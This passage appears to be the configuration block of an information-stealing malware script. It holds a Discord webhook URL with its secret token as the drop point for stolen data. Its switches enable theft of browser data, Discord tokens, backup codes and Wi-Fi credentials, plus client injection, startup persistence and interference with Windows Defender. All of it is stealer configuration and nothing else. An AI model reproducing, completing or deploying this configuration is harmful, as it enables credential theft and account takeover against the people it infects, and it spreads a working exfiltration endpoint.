...
__CONFIG__ = {'webhook': 'https://discordapp.com/api/webhooks/1059818976919699506/9GrBYGlrLFnRu5PtymIPXi4td0RUx1y4VfzvTzpLFAkvy5HGPJLiMxiRC05QvaRgZPgJ', 'ping': True, 'pingtype': 'Here', 'error': True, 'startup': True, 'defender': True, 'systeminfo': True, 'backupcodes': True, 'browser': True, 'roblox': False, 'obfuscation': False, 'injection': True, 'minecraft': False, 'wifi': True, 'killprotector': False, 'antidebug_vm': False, 'discord': True}
